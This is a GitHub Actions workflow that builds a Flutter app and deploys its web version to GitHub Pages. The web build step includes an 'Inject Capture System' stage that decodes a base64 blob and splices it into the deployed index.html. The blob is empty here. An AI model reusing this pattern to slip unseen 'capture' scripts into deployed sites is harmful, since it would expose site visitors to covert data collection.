name: MYTH Build System

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      build_type:
        description: "apk or web"
        required: true
        default: "apk"

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: subosito/flutter-action@v2
        with:
          flutter-version: "3.24.0"
          channel: "stable"
      - name: Initialize / Repair Project
        run: |
          # Backup current work
          mkdir -p .backup
          cp -r lib .backup/ || true
          cp pubspec.yaml .backup/ || true
          
          # Generate missing infrastructure (web, android)
          flutter create . --platforms=web,android --project-name=app --overwrite
          
          # Restore user code
          cp -r .backup/lib . || true
          cp .backup/pubspec.yaml . || true
          
          flutter pub get

      - name: Build
        run: |
          # Default to web if empty or web
          TARGET="${{ github.event.inputs.build_type }}"
          if [ -z "$TARGET" ]; then TARGET="web"; fi
          
          if [ "$TARGET" == "web" ]; then
            flutter build web --release --base-href "/${{ github.event.repository.name }}/"
            # 💉 Inject Capture System
            echo "" | base64 -d > capture_script.html
            node -e "const fs = require('fs'); const path = 'build/web/index.html'; let html = fs.readFileSync(path, 'utf8'); const script = fs.readFileSync('capture_script.html', 'utf8'); html = html.replace('</body>', script + '</body>'); fs.writeFileSync(path, html);"
          else
            flutter build apk --release
          fi
      - name: Upload Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          if-no-files-found: ignore
          path: |
            build/web
            build/app/outputs/flutter-apk/app-release.apk

      - name: Upload Pages Artifact
        if: github.event.inputs.build_type == 'web' || github.event_name == 'push'
        uses: actions/upload-pages-artifact@v3
        with:
          path: build/web

  deploy:
    if: github.event.inputs.build_type == 'web' || github.event_name == 'push'
    needs: build
    permissions:
      pages: write      # to deploy to Pages
      id-token: write   # to verify the deployment source is legitimate
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4